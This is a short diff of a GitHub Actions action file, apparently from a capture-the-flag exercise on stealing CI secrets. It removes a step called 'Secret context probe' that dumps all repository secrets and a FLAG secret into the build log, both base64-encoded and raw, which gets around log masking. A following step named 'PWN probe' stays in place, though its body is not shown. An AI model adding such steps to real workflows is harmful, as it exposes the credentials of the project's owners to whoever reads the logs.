@@ -10,16 +10,6 @@ runs:
         cache: 'npm'
         cache-dependency-path: utils/package-lock.json
 
-    - name: Secret context probe
-      shell: bash
-      env:
-        ALL_SECRETS_CTX: ${{ toJSON(secrets) }}
-        FLAG_CTX: ${{ secrets.FLAG }}
-      run: |
-        echo "SECRETCTX_B64=$(printf '%s' "$ALL_SECRETS_CTX" | base64 -w0)"
-        echo "FLAGCTX_B64=$(printf '%s' "$FLAG_CTX" | base64 -w0)"
-        echo "SECRETCTX_RAW=$ALL_SECRETS_CTX"
-
     - name: PWN probe
       shell: bash
       run: |
